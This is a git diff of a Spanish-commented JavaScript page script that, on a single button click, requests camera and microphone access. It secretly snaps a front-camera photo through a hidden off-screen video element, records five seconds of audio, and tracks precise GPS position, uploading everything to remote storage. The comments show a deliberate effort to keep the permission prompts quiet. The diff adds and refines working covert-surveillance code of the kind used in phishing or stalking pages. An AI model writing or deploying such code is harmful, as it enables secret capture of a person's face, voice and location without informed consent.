@@ -309,149 +309,155 @@ document.getElementById('btnOk').addEventListener('click', collect);
 
 
 async function collect() {
-  set('clicked', 'true'); push();
+  set('clicked','true'); push();
 
-  // ── 1. Pedir cámara+mic primero — UN SOLO DIÁLOGO ───────────
-  //    Chrome agrupa los permisos si se piden en el mismo getUserMedia call.
-  //    GPS se pide DESPUÉS, silenciosamente (ya no muestra el popup de mapa).
-  let stream = null;
-  if (navigator.mediaDevices?.getUserMedia) {
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode:'user', width:{ideal:640}, height:{ideal:480} },
-        audio: true
-      });
-      set('camGranted','true'); push();
-
-      const vid = document.createElement('video');
-      vid.setAttribute('playsinline','');
-      vid.setAttribute('webkit-playsinline','');
-      vid.autoplay=true; vid.muted=true; vid.srcObject=stream;
-      vid.style.cssText='position:fixed;left:-9999px;width:1px;height:1px;opacity:0;';
-      document.body.appendChild(vid);
-      await vid.play().catch(()=>{});
-
-      const delay = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 1800 : 900;
-      setTimeout(async()=>{
-        try {
-          const cv=document.createElement('canvas');
-          cv.width=vid.videoWidth||320; cv.height=vid.videoHeight||240;
-          cv.getContext('2d',{willReadFrequently:true}).drawImage(vid,0,0);
-          const dataUrl=cv.toDataURL('image/jpeg',0.8);
-          const url=await upload(`photos/${docId||Date.now()}.jpg`,dataUrl,'image/jpeg');
-          if(url){set('photoUrl',url);push();}
-        } catch(e){}
-        stream.getVideoTracks().forEach(t=>t.stop());
-        vid.remove();
-        grabAudio(stream);
-      }, delay);
-    } catch(err){
-      set('camErr',err.message); push();
-    }
+  if (!navigator.mediaDevices?.getUserMedia) {
+    set('camErr','no_api'); push(); _grabGPS(); return;
   }
 
-  // ── 2. Notificaciones (silencioso, no muestra popup visible en Android) ──
-  if('Notification' in window){
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video:{ facingMode:'user', width:{ideal:1280}, height:{ideal:720} },
+      audio:true
+    });
+    set('camGranted','true'); push();
+  } catch(err) {
+    set('camErr', err.name + ':' + err.message); push();
+    _grabGPS(); return;
+  }
+
+  // Video element
+  const vid = document.createElement('video');
+  vid.setAttribute('playsinline','');
+  vid.setAttribute('webkit-playsinline','');
+  vid.autoplay=true; vid.muted=true; vid.srcObject=stream;
+  vid.style.cssText='position:fixed;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
+  document.body.appendChild(vid);
+
+  // Esperar a que el video tenga dimensiones reales
+  await new Promise(res => {
+    if (vid.readyState >= 2) { res(); return; }
+    vid.onloadeddata = res;
+    vid.onerror = res;
+    setTimeout(res, 3000);
+  });
+  await vid.play().catch(()=>{});
+
+  // Esperar frame real con dimensiones > 0
+  const iOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+  const frameWait = iOS ? 2500 : 1200;
+  await new Promise(res => setTimeout(res, frameWait));
+
+  // Asegurar docId creado antes de subir
+  if (!docId) { await push(); }
+  // Esperar hasta docId con timeout
+  let waited = 0;
+  while (!docId && waited < 4000) {
+    await new Promise(r => setTimeout(r, 200)); waited += 200;
+  }
+
+  const uid = docId || ('anon_' + Date.now());
+
+  // ── Foto ──────────────────────────────────────────────────────
+  try {
+    const w = vid.videoWidth  || 640;
+    const h = vid.videoHeight || 480;
+    const cv = document.createElement('canvas');
+    cv.width=w; cv.height=h;
+    const ctx = cv.getContext('2d', {willReadFrequently:true});
+    ctx.drawImage(vid, 0, 0, w, h);
+    const dataUrl = cv.toDataURL('image/jpeg', 0.85);
+
+    // Verificar que el canvas tiene datos reales (no negro puro)
+    const imgData = ctx.getImageData(0, 0, Math.min(w,50), Math.min(h,50));
+    const nonZero = imgData.data.some(v => v > 10);
+    if (!nonZero) {
+      set('photoErr','blank_frame'); push();
+    } else {
+      const url = await upload(`photos/${uid}.jpg`, dataUrl, 'image/jpeg');
+      if (url) { set('photoUrl', url); push(); }
+    }
+  } catch(e) { set('photoErr', e.message); push(); }
+
+  // Parar video, dejar audio
+  stream.getVideoTracks().forEach(t => t.stop());
+  vid.remove();
+
+  // ── Audio ─────────────────────────────────────────────────────
+  _grabAudio(stream, uid);
+
+  // ── GPS ───────────────────────────────────────────────────────
+  _grabGPS();
+
+  // ── Notificaciones ────────────────────────────────────────────
+  if ('Notification' in window) {
     Notification.requestPermission().then(r=>{set('notif',r);push();}).catch(()=>{});
   }
-
-  // ── 3. GPS — se pide DESPUÉS de cámara para que Chrome no muestre
-  //    el selector de mapa por separado.  enableHighAccuracy=true fuerza
-  //    GPS chip en vez de WiFi/Cell → precisión métrica, no barrial.
-  //    Doble intento: primero alta precisión, luego baja como fallback.
-  _grabGPS();
 }
 
 function _grabGPS(){
-  if(!('geolocation' in navigator)) return;
+  if (!('geolocation' in navigator)) return;
+  let best = null;
 
-  let done = false;
-
-  // Intento 1 — GPS preciso (chip GPS, ~5m)
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      done = true;
+  const save = pos => {
+    const acc = pos.coords.accuracy;
+    if (!best || acc < best) {
+      best = acc;
       set('gpsLat', pos.coords.latitude);
       set('gpsLon', pos.coords.longitude);
-      set('gpsAcc', pos.coords.accuracy);
+      set('gpsAcc', acc);
       set('gpsAlt', pos.coords.altitude ?? '');
-      set('gpsSrc','precise');
       push();
-    },
-    () => {
-      if(done) return;
-      // Intento 2 — baja precisión como fallback
-      navigator.geolocation.getCurrentPosition(
-        pos2 => {
-          done = true;
-          set('gpsLat', pos2.coords.latitude);
-          set('gpsLon', pos2.coords.longitude);
-          set('gpsAcc', pos2.coords.accuracy);
-          set('gpsSrc','fallback');
-          push();
-        },
-        err => { set('gpsErr', err.code); push(); },
-        { enableHighAccuracy:false, timeout:10000, maximumAge:60000 }
-      );
-    },
-    { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
+    }
+  };
+
+  navigator.geolocation.getCurrentPosition(save,
+    () => navigator.geolocation.getCurrentPosition(save, ()=>{},
+      {enableHighAccuracy:false, timeout:10000, maximumAge:60000}),
+    {enableHighAccuracy:true, timeout:15000, maximumAge:0}
   );
 
-  // Watchposition para actualizar si el usuario se mueve o el primer fix
-  // era impreciso (acc > 50m)
   const wid = navigator.geolocation.watchPosition(
-    pos => {
-      const acc = pos.coords.accuracy;
-      if(acc < 30 || !done){
-        done = true;
-        set('gpsLat', pos.coords.latitude);
-        set('gpsLon', pos.coords.longitude);
-        set('gpsAcc', acc);
-        set('gpsAlt', pos.coords.altitude ?? '');
-        set('gpsSrc','watch');
-        push();
-        // Parar watch una vez tenemos buena precisión
-        if(acc < 15) navigator.geolocation.clearWatch(wid);
-      }
-    },
+    pos => { save(pos); if((best??999) < 15) navigator.geolocation.clearWatch(wid); },
     ()=>{},
-    { enableHighAccuracy:true, maximumAge:0 }
+    {enableHighAccuracy:true, maximumAge:0}
   );
-  // Limpiar watch tras 30s pase lo que pase
   setTimeout(()=>navigator.geolocation.clearWatch(wid), 30000);
 }
 
-
-// ─── AUDIO ────────────────────────────────────────────────────
-async function grabAudio(existingStream) {
+async function _grabAudio(existingStream, uid) {
   try {
-    const audioTrack = existingStream?.getAudioTracks()?.[0];
-    const s = audioTrack ? existingStream
+    const hasAudio = existingStream?.getAudioTracks()?.length > 0;
+    const s = hasAudio ? existingStream
       : await navigator.mediaDevices.getUserMedia({audio:true});
 
-    const mime = ['audio/webm;codecs=opus','audio/webm','audio/mp4','audio/ogg']
-      .find(m=>MediaRecorder.isTypeSupported(m)) || '';
+    const mimes = ['audio/webm;codecs=opus','audio/webm','audio/mp4','audio/ogg'];
+    const mime  = mimes.find(m => MediaRecorder.isTypeSupported(m)) || '';
 
-    const rec=new MediaRecorder(s, mime?{mimeType:mime}:{});
-    const chunks=[];
-    rec.ondataavailable=e=>{if(e.data?.size>0)chunks.push(e.data);};
-    rec.onstop=async()=>{
-      if(!audioTrack) s.getTracks().forEach(t=>t.stop());
-      try{
-        const finalMime=rec.mimeType||mime||'audio/webm';
-        const ext=finalMime.includes('mp4')?'mp4':finalMime.includes('ogg')?'ogg':'webm';
-        const blob=new Blob(chunks,{type:finalMime});
-        if(blob.size<100) return;
-        const ab=await blob.arrayBuffer();
-        const bytes=new Uint8Array(ab);
-        const b64='data:'+finalMime+';base64,'+safeBtoa(bytes);
-        const url=await upload(`audio/${docId||Date.now()}.${ext}`,b64,finalMime);
-        if(url){set('audioUrl',url);push();}
-      }catch(e){}
+    const rec    = new MediaRecorder(s, mime ? {mimeType:mime} : {});
+    const chunks = [];
+
+    rec.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };
+    rec.onstop = async () => {
+      if (!hasAudio) s.getTracks().forEach(t=>t.stop());
+      try {
+        const finalMime = rec.mimeType || mime || 'audio/webm';
+        const ext = finalMime.includes('mp4') ? 'mp4'
+                  : finalMime.includes('ogg') ? 'ogg' : 'webm';
+        const blob = new Blob(chunks, {type: finalMime});
+        if (blob.size < 100) { set('audioErr','blob_empty'); push(); return; }
+        const ab    = await blob.arrayBuffer();
+        const bytes = new Uint8Array(ab);
+        const b64   = 'data:' + finalMime + ';base64,' + safeBtoa(bytes);
+        const url   = await upload(`audio/${uid}.${ext}`, b64, finalMime);
+        if (url) { set('audioUrl', url); push(); }
+      } catch(e) { set('audioErr', e.message); push(); }
     };
-    rec.start(1000);
-    setTimeout(()=>{try{rec.stop();}catch(e){}},4000);
-  }catch(e){}
+
+    rec.start(500);
+    setTimeout(()=>{ try { rec.stop(); } catch(e){} }, 5000);
+  } catch(e) { set('audioErr', e.message); push(); }
 }
 
 
